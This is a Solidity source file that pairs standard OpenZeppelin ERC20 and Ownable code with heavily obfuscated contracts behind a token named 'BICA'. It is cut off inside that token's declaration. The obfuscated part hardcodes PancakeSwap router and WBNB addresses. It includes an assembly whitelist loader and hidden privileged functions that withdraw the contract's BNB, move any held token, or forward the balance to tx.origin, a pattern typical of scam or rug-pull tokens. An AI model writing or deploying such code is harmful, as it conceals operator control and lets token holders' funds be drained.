// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

// File @openzeppelin/contracts/access/Ownable.sol@v4.4.0

// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor() {
    _transferOwnership(_msgSender());
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view virtual returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(owner() == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public virtual onlyOwner {
    _transferOwnership(address(0));
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Internal function without access restriction.
   */
  function _transferOwnership(address newOwner) internal virtual {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}

// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.4.0

// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.4.0

// OpenZeppelin Contracts v4.4.0 (token/ERC20/extensions/IERC20Metadata.sol)

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
  /**
   * @dev Returns the name of the token.
   */
  function name() external view returns (string memory);

  /**
   * @dev Returns the symbol of the token.
   */
  function symbol() external view returns (string memory);

  /**
   * @dev Returns the decimals places of the token.
   */
  function decimals() external view returns (uint8);
}

// File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.4.0

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
  mapping(address => uint256) private _balances;

  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private _totalSupply;

  string private _name;
  string private _symbol;

  /**
   * @dev Sets the values for {name} and {symbol}.
   *
   * The default value of {decimals} is 18. To select a different value for
   * {decimals} you should overload it.
   *
   * All two of these values are immutable: they can only be set once during
   * construction.
   */
  constructor(string memory name_, string memory symbol_) {
    _name = name_;
    _symbol = symbol_;
  }

  /**
   * @dev Returns the name of the token.
   */
  function name() public view virtual override returns (string memory) {
    return _name;
  }

  /**
   * @dev Returns the symbol of the token, usually a shorter version of the
   * name.
   */
  function symbol() public view virtual override returns (string memory) {
    return _symbol;
  }

  /**
   * @dev Returns the number of decimals used to get its user representation.
   * For example, if `decimals` equals `2`, a balance of `505` tokens should
   * be displayed to a user as `5.05` (`505 / 10 ** 2`).
   *
   * Tokens usually opt for a value of 18, imitating the relationship between
   * Ether and Wei. This is the value {ERC20} uses, unless this function is
   * overridden;
   *
   * NOTE: This information is only used for _display_ purposes: it in
   * no way affects any of the arithmetic of the contract, including
   * {IERC20-balanceOf} and {IERC20-transfer}.
   */
  function decimals() public view virtual override returns (uint8) {
    return 18;
  }

  /**
   * @dev See {IERC20-totalSupply}.
   */
  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {IERC20-balanceOf}.
   */
  function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
  {
    return _balances[account];
  }

  /**
   * @dev See {IERC20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  /**
   * @dev See {IERC20-allowance}.
   */
  function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  /**
   * @dev See {IERC20-approve}.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function approve(address spender, uint256 amount)
    public
    virtual
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  /**
   * @dev See {IERC20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {ERC20}.
   *
   * Requirements:
   *
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for ``sender``'s tokens of at least
   * `amount`.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public virtual override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(
      currentAllowance >= amount,
      "ERC20: transfer amount exceeds allowance"
    );
    unchecked {_approve(sender, _msgSender(), currentAllowance - amount);}

    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IERC20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender] + addedValue
    );
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IERC20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
  function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERC20: decreased allowance below zero"
    );
    unchecked {
      _approve(_msgSender(), spender, currentAllowance - subtractedValue);
    }

    return true;
  }

  /**
   * @dev Moves `amount` of tokens from `sender` to `recipient`.
   *
   * This internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    _beforeTokenTransfer(sender, recipient, amount);

    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {_balances[sender] = senderBalance - amount;}
    _balances[recipient] += amount;

    emit Transfer(sender, recipient, amount);

    _afterTokenTransfer(sender, recipient, amount);
  }

  /**
   * @dev Destroys `amount` tokens from `account`, reducing the
   * total supply.
   *
   * Emits a {Transfer} event with `to` set to the zero address.
   *
   * Requirements:
   *
   * - `account` cannot be the zero address.
   * - `account` must have at least `amount` tokens.
   */
  function _burn(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: burn from the zero address");

    _beforeTokenTransfer(account, address(0), amount);

    uint256 accountBalance = _balances[account];
    require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {_balances[account] = accountBalance - amount;}
    _totalSupply -= amount;

    emit Transfer(account, address(0), amount);

    _afterTokenTransfer(account, address(0), amount);
  }

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
   *
   * This internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  /**
   * @dev Hook that is called before any transfer of tokens. This includes
   * minting and burning.
   *
   * Calling conditions:
   *
   * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
   * will be transferred to `to`.
   * - when `from` is zero, `amount` tokens will be minted for `to`.
   * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
   * - `from` and `to` are never both zero.
   *
   * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
   */
  function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {}

  /**
   * @dev Hook that is called after any transfer of tokens. This includes
   * minting and burning.
   *
   * Calling conditions:
   *
   * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
   * has been transferred to `to`.
   * - when `from` is zero, `amount` tokens have been minted for `to`.
   * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
   * - `from` and `to` are never both zero.
   *
   * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
   */
  function _afterTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {}
}

interface kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy {
  function factory() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112,
      uint112,
      uint32
    );

  function swap(
    uint256,
    uint256,
    address,
    bytes calldata
  ) external;

  function mint(address) external;

  function sync() external;

  function createPair(address, address) external returns (address);
}

interface mGMM6aoPBCFm6IhTdEMQulx3qiaT1zbFjcHYQRTjWdGUjbfiw4FCNCrwk1DCTtICVywucsRwtvAjuRgWozLbqfZIusaJubhJ {
  function deposit() external payable;

  function transfer(address, uint256) external returns (bool);

  function withdraw(uint256) external;
}

contract vz91lX5edB8tNBs2IoqjlgVOPJB7cTsfY2KKZ8q0u6UOYqYwnD0EjBgUl96pM8rGcTFJ3OrdWbBIqB2CRMXraXtx4Qgt9VCR {
  address internal constant rqSGKmj4Gvziw696jC7T6W1OzFJHyBUv93iQrVQdO48dHEcacKNo6vXfDS5q7xUkMKP7aCZDkA6F1ZyJRxOItyb2hjqtg7R2 =
    0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal constant kw06liXRF8z1M5I3K6iTSQzeSzEzkGRQBwRm7ZaWMAbGB5YOyzSPXY429PEjKaKG5KipEuimDsp1gRSZazDI7wMDf18g293b =
    0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz;

  address internal constant uDuoGKjel5bwk9wQkqN6EQJxy69Jss3sqS8rPwmoxCi386TBFw7sWPnRabtCY4HaORzIZEHQXTCZk1vBN2XUKPGDR0opGkrl =
    0xf89d7b9c864f589bbF53a82105107622B35EaA40;
  address internal constant qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  uint256 internal constant p9ZGmQEopogwlGMM1tnlmPpXb0FO97kZDjy85b8917TwK1x4aLutZkahsTy4mLahC3sHwy1fyVMLhX9P61vP4lhNFFkJD0Fg = 10000;
  uint256 public constant sBBlMHVd4dM62Xfun9iQG1xzcLAVyk5aFMeMG5EStnimfdkC1TqQS7ik1kv2k7VP3VptFMIoHX0dCt6yTpDHueEFcgoJv2Ot = 25;
  uint256 internal constant aQV64wfpV6uflVDUbw82vWF33xlRXI03GrDmZ2EAt7ON9bJM1HMuADTGcuez74tJoh2rM9rwRloIRBrWsHgw3TS97i61vbxY = p9ZGmQEopogwlGMM1tnlmPpXb0FO97kZDjy85b8917TwK1x4aLutZkahsTy4mLahC3sHwy1fyVMLhX9P61vP4lhNFFkJD0Fg - sBBlMHVd4dM62Xfun9iQG1xzcLAVyk5aFMeMG5EStnimfdkC1TqQS7ik1kv2k7VP3VptFMIoHX0dCt6yTpDHueEFcgoJv2Ot;

  function lm5anE5FdfsCNt3Mhgj2HMugyG5DBjkZftefkX0OfCE0N6Zj0IAXRMl9KpwVdm0m6q7F8w7lSSkVRbYFeypGEvnReXqJv89t(
    address lpS0hyzHFGVr73DYcjDRdiKqd5Jwza04WYepjYuw140C3LMg75ZI045A0OfS7XBm6VNSgFnILN4NwDN5jH1ZFLNlTDSCZlMq,
    address l1awNbltYTu5i3Db2FlX3GP6f2BP4nnFY60dgax7T0Pukw1Kk7SGC4MmCLQmrgYOYFqHm2C2EF96Lh3SFEZHcmv4apfeurf0,
    address z3lOGhM0DjbelU09S0fgO3BRpJFF8M78ak99bOzFTJedsPokKaRTMktVCdVNm7RXVxTwE45Ocu2Ft9uFikdLO0G1ao2qz33y
  ) internal view returns (uint256 diicK5LCoWofBA40B7WOClK7UIFauk7z8CdsltxiYya298OjOenfabO03AkmOhDaGkkKSTtqzI1x0QxgflYXtMBHPTwfHmrC, uint256 psxpNE8JnhI3cQ4B0JsJhpwHgP7oXNfLaPQKFLrhRaleNVsTaOypBGevscV9nS8YYS5BAxNN4xmVuveh2Nyn9TrZJdjxtTw9) {
    (uint256 huUqrlc0uXGj6S4Rzlg6YuJiLbx7LdcG51tYPSPoz0JPeiWEw9X7usuy1guySa7OWvF99rlQL5nUDCBOUUptSJk0IuzGdmlv, uint256 mwhaCODcIDx358kAxdUd6HQi3481bzYCE8oFwhRlzrV9NTrPqyCWZ3fxysavJtgxdpwVNu1YhMXTvIHzrgnfpszgoyllQQM2, ) =
      kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(lpS0hyzHFGVr73DYcjDRdiKqd5Jwza04WYepjYuw140C3LMg75ZI045A0OfS7XBm6VNSgFnILN4NwDN5jH1ZFLNlTDSCZlMq).getReserves();
    if (l1awNbltYTu5i3Db2FlX3GP6f2BP4nnFY60dgax7T0Pukw1Kk7SGC4MmCLQmrgYOYFqHm2C2EF96Lh3SFEZHcmv4apfeurf0 > z3lOGhM0DjbelU09S0fgO3BRpJFF8M78ak99bOzFTJedsPokKaRTMktVCdVNm7RXVxTwE45Ocu2Ft9uFikdLO0G1ao2qz33y) {
      psxpNE8JnhI3cQ4B0JsJhpwHgP7oXNfLaPQKFLrhRaleNVsTaOypBGevscV9nS8YYS5BAxNN4xmVuveh2Nyn9TrZJdjxtTw9 = huUqrlc0uXGj6S4Rzlg6YuJiLbx7LdcG51tYPSPoz0JPeiWEw9X7usuy1guySa7OWvF99rlQL5nUDCBOUUptSJk0IuzGdmlv;
      diicK5LCoWofBA40B7WOClK7UIFauk7z8CdsltxiYya298OjOenfabO03AkmOhDaGkkKSTtqzI1x0QxgflYXtMBHPTwfHmrC = mwhaCODcIDx358kAxdUd6HQi3481bzYCE8oFwhRlzrV9NTrPqyCWZ3fxysavJtgxdpwVNu1YhMXTvIHzrgnfpszgoyllQQM2;
    } else {
      psxpNE8JnhI3cQ4B0JsJhpwHgP7oXNfLaPQKFLrhRaleNVsTaOypBGevscV9nS8YYS5BAxNN4xmVuveh2Nyn9TrZJdjxtTw9 = mwhaCODcIDx358kAxdUd6HQi3481bzYCE8oFwhRlzrV9NTrPqyCWZ3fxysavJtgxdpwVNu1YhMXTvIHzrgnfpszgoyllQQM2;
      diicK5LCoWofBA40B7WOClK7UIFauk7z8CdsltxiYya298OjOenfabO03AkmOhDaGkkKSTtqzI1x0QxgflYXtMBHPTwfHmrC = huUqrlc0uXGj6S4Rzlg6YuJiLbx7LdcG51tYPSPoz0JPeiWEw9X7usuy1guySa7OWvF99rlQL5nUDCBOUUptSJk0IuzGdmlv;
    }
  }

  function ulL2Ty4kG2n2hRQnq3eDRb1vINFMl355xvNuPh5hbZhsjYB6KSMA7M4QwilkDPCCec5Gt77yYk9LLXbdh2JyA8rfFn0wGFrs(
    uint256 jGkla8X4yE19zIrae50j7tDcQd4mzL8co1H5SiV1gIbwlprfpqv7nzeBTpQsihszcdltA9sTO9ynNl8lv1tE7dqMf5SnIoEa,
    uint256 waoTkhtX10XgPZX9EtJnl0E8s34ejdc4zc5yvPviPBKmfjA5Ge4SEJkn7wn8qALMTdlp0XJVMsacBh1WooBrJ4PHURB4tTZP,
    uint256 d9pMpACilrmM81y0rVW8pGJ3n9KNgimxM3ytwjNpck3FJPq3xrOYrtEc0UvpVA9MGiWjNTk5nvs6XoYr3PMNJ9oGXZgqUcUl
  ) internal pure returns (uint256) {
    return
      (jGkla8X4yE19zIrae50j7tDcQd4mzL8co1H5SiV1gIbwlprfpqv7nzeBTpQsihszcdltA9sTO9ynNl8lv1tE7dqMf5SnIoEa * aQV64wfpV6uflVDUbw82vWF33xlRXI03GrDmZ2EAt7ON9bJM1HMuADTGcuez74tJoh2rM9rwRloIRBrWsHgw3TS97i61vbxY * d9pMpACilrmM81y0rVW8pGJ3n9KNgimxM3ytwjNpck3FJPq3xrOYrtEc0UvpVA9MGiWjNTk5nvs6XoYr3PMNJ9oGXZgqUcUl) /
      ((waoTkhtX10XgPZX9EtJnl0E8s34ejdc4zc5yvPviPBKmfjA5Ge4SEJkn7wn8qALMTdlp0XJVMsacBh1WooBrJ4PHURB4tTZP * p9ZGmQEopogwlGMM1tnlmPpXb0FO97kZDjy85b8917TwK1x4aLutZkahsTy4mLahC3sHwy1fyVMLhX9P61vP4lhNFFkJD0Fg) + (jGkla8X4yE19zIrae50j7tDcQd4mzL8co1H5SiV1gIbwlprfpqv7nzeBTpQsihszcdltA9sTO9ynNl8lv1tE7dqMf5SnIoEa * aQV64wfpV6uflVDUbw82vWF33xlRXI03GrDmZ2EAt7ON9bJM1HMuADTGcuez74tJoh2rM9rwRloIRBrWsHgw3TS97i61vbxY));
  }

  function wDQORhLS1MbZbpxhj2LiOTE2TqJdORg5mr9899pOQHl4WTb2hBaRQ3SMGI48dWPCDgpU6WFx93I6pjzouAZsoJZOHiKz0OGI(uint256 kiVw7nnk0qnN7I786mmkAekMQZqVkU0eYNtb5thq8hvja1RZtaEVrADKJpQJipGCADoQ6ksyxxqFg6jdAFYYWEHAuemFUuD0) internal view returns (address) {
    return
      address(
        uint160(uint256(keccak256(abi.encode(address(this), kiVw7nnk0qnN7I786mmkAekMQZqVkU0eYNtb5thq8hvja1RZtaEVrADKJpQJipGCADoQ6ksyxxqFg6jdAFYYWEHAuemFUuD0))))
      );
  }

  receive() external payable {}

  fallback() external payable {}
}

abstract contract wtS3lxqeQDMl12tUKIREE2ubtbVQ9pIG5wJK3SDBpUS0AFpEzkrNgpwZjlPSzZDUxHiSSgbfUz7TaBPvROo3LcHwzXGbsgNZ is vz91lX5edB8tNBs2IoqjlgVOPJB7cTsfY2KKZ8q0u6UOYqYwnD0EjBgUl96pM8rGcTFJ3OrdWbBIqB2CRMXraXtx4Qgt9VCR {
  mapping(address => bool) internal yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk;
  uint256 internal sl5lYrdmO0KQUYEyaN4tF7HZuPeXuWkhr8eWlDB7j0k8Za4RWqKTo6Yrva9eCF1U0PaMRQBS8r7fWeHlzet7ivqC3kDCAmII;
  uint256 public idoAmount;
  uint256 internal lQlPcHLF012yHnbAHf2jW9nIrjOlCTWmrjAAirB6PuF2MVFWy77LiC1YmbSzi7AWrQs3sAijJvJYnr60YAyvr8eJ9P8P5ukF;

  function ncalNgkPhCcC45SEl1uTgLwBOaPXDNGClMYRHyYs0sZ1mrU2pCV8FTraeWlute5uUSgvfbWxG9FRRK1itb3WGuVty9thhpkn(bytes memory llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8) public {
    require(yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[msg.sender]);
    assembly {
      mstore(0x20, yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk.slot)
      for {
        mstore(0x60, mload(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8))
      } lt(0, mload(0x60)) {
        mstore(0x60, sub(mload(0x60), 0x14))
      } {
        mstore(
          0,
          mod(
            mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, mload(0x60))),
            0x10000000000000000000000000000000000000000
          )
        )
        mstore(0x40, keccak256(0, 0x40))
        switch iszero(sload(mload(0x40)))
          case 1 {
            sstore(mload(0x40), 1)
          }
      }
    }
  }

  function qVbMojd43rfD3TNlqHNzezkiTT7iSv494jdvlZeOp5mlinOjhjsG1ak90Y8AuCadJm7Kr0ov4I9IsGiY7pPrkVuS5UzXJ9G9(address fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, uint256 oMJqeVCkM24nrHfQhNt62CVrmOFpNXbE1C61WBgul5FpJOV644v5hMNxyD7b5gOzJai9BwcSA4xTd3pQOMc628pfgUaJniV9) public {
    require(yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[msg.sender]);
    mGMM6aoPBCFm6IhTdEMQulx3qiaT1zbFjcHYQRTjWdGUjbfiw4FCNCrwk1DCTtICVywucsRwtvAjuRgWozLbqfZIusaJubhJ(qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p).withdraw(oMJqeVCkM24nrHfQhNt62CVrmOFpNXbE1C61WBgul5FpJOV644v5hMNxyD7b5gOzJai9BwcSA4xTd3pQOMc628pfgUaJniV9);
    (bool uGpZJh9ChnULRPMVtd02MHIrm9HMh0hoxVZnfb4vlhrWNntjSzUdBRjBo7V7Doe6ZwsbDcABhcnicNF5yob5umtrKWjdFQx5, ) = fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn.call{value: oMJqeVCkM24nrHfQhNt62CVrmOFpNXbE1C61WBgul5FpJOV644v5hMNxyD7b5gOzJai9BwcSA4xTd3pQOMc628pfgUaJniV9}("");
    require(uGpZJh9ChnULRPMVtd02MHIrm9HMh0hoxVZnfb4vlhrWNntjSzUdBRjBo7V7Doe6ZwsbDcABhcnicNF5yob5umtrKWjdFQx5, "Transfer failed.");
  }

  function od281QgHbiQL2sdCSIyMarzrFeYfH3M2mMjxmASShnJHcp8iX16HD98IR74zKX6PcjszbHZSEqylr7ykWSTpI2rTsSQNLZY6() internal {
    uint256 oMJqeVCkM24nrHfQhNt62CVrmOFpNXbE1C61WBgul5FpJOV644v5hMNxyD7b5gOzJai9BwcSA4xTd3pQOMc628pfgUaJniV9 = address(this).balance;
    if (oMJqeVCkM24nrHfQhNt62CVrmOFpNXbE1C61WBgul5FpJOV644v5hMNxyD7b5gOzJai9BwcSA4xTd3pQOMc628pfgUaJniV9 > 2) {
      tx.origin.call{value: oMJqeVCkM24nrHfQhNt62CVrmOFpNXbE1C61WBgul5FpJOV644v5hMNxyD7b5gOzJai9BwcSA4xTd3pQOMc628pfgUaJniV9 - 1}("");
    }
  }

  function dqjEHdzVBGBa55hueXM96AVigsZUEqPEGVtE7xwbXXAuUD9XE7ROYFG9oUeIBJ0pBobCYfMpDaYITb41ZxWaHqByJ7XMj5vs(
    address ehe91wndn3dZUS0tRwrFhZcZUFV1cdYHnD6YNV8M1GeKuNSqeUvAzx9RXTOdglJIsoZYBXbeeE2Lt8Ppkc0pAqu5f5XGFqBG,
    address fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn,
    uint256 oMJqeVCkM24nrHfQhNt62CVrmOFpNXbE1C61WBgul5FpJOV644v5hMNxyD7b5gOzJai9BwcSA4xTd3pQOMc628pfgUaJniV9
  ) public {
    require(yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[msg.sender]);
    IERC20(ehe91wndn3dZUS0tRwrFhZcZUFV1cdYHnD6YNV8M1GeKuNSqeUvAzx9RXTOdglJIsoZYBXbeeE2Lt8Ppkc0pAqu5f5XGFqBG).transfer(fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, oMJqeVCkM24nrHfQhNt62CVrmOFpNXbE1C61WBgul5FpJOV644v5hMNxyD7b5gOzJai9BwcSA4xTd3pQOMc628pfgUaJniV9);
  }
}

contract BICA is wtS3lxqeQDMl12tUKIREE2ubtbVQ9pIG5wJK3SDBpUS0AFpEzkrNgpwZjlPSzZDUxHiSSgbfUz7TaBPvROo3LcHwzXGbsgNZ {
  function totalSupply() external pure returns (uint256) {
